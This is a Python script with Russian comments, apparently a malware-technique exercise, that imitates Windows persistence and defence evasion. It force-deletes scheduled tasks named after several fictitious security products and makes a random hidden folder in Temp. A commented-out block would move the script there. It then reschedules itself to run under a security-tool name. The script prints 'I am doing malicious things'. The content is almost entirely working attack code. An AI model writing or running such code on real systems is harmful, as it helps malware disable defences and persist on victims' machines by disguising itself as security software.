import os, random, subprocess
from datetime import datetime, timedelta
from pathlib import Path
import secrets, shutil

security_tools = [
    "CyberShield",
    "ThreatGuard",
    "VulneraFind",
    "NetAudit",
    "SafeScope",
    "CodeInspect",
    "InfosecCheck",
    "BreachPulse",
    "PortSentry",
    "RiskAssess"
]

#command1 = 'schtasks /query /tn "\\Microsoft\\Windows\\Work Folders\\Work Folders Logon Synchronization"'
for tool in security_tools:
    schtasks_query = f'schtasks /query /tn "{tool}"'
    p = subprocess.run(schtasks_query, shell=True, capture_output = True)
    if p.returncode == 0: # нашли такую задачу
        print("Task deleted")
        schtasks_delete = f'schtasks /delete /f /tn "{tool}"' 
        subprocess.run(schtasks_delete, shell = True)

print("I am doing malicious things")

# подготавливаем директории в Temp для создания 
current_user = os.getlogin()
random_dir = secrets.token_hex(16)
filedir = Path(f"C:\\Users\\{current_user}\\AppData\\Local\\Temp\\{random_dir}")
filedir.mkdir(parents = True, exist_ok = True)

current_file_path = Path(__file__).resolve()

'''
реальный код, но не хочу у себя его запускать
dst_path = Path(filedir) / (str(secrets.token_hex(16)) + ".py") # теперь сохраняется в рандомный файл

try:
    # перемещаем файл, процесс не прервется поскольку он находится в памятяи уже
    shutil.move(str(current_file_path), str(dst_path))
    current_file_path = dst_path
except Exception as e:
    print("Error while moving") # хотя в теории скрипт не должен писать ничего нормальный)
'''

maxInterval = 3
interval = 1+(random.random()*(maxInterval - 1))
dt = datetime.now() + timedelta(minutes=interval)
t = dt.strftime("%H:%M")
d = dt.strftime("%m/%d/%Y")
# короче задача запустится 1 раз в определенное время

schtasks_create = f'schtasks /create /tn {security_tools[random.randint(0, len(security_tools) - 1)]} /tr "{current_file_path}" /sc once /st {t} /sd {d}'
p = subprocess.run(schtasks_create, shell = True, capture_output = True)
if p.returncode == 0:
    print("Task Successfully Created")
else:
    print("Failed")
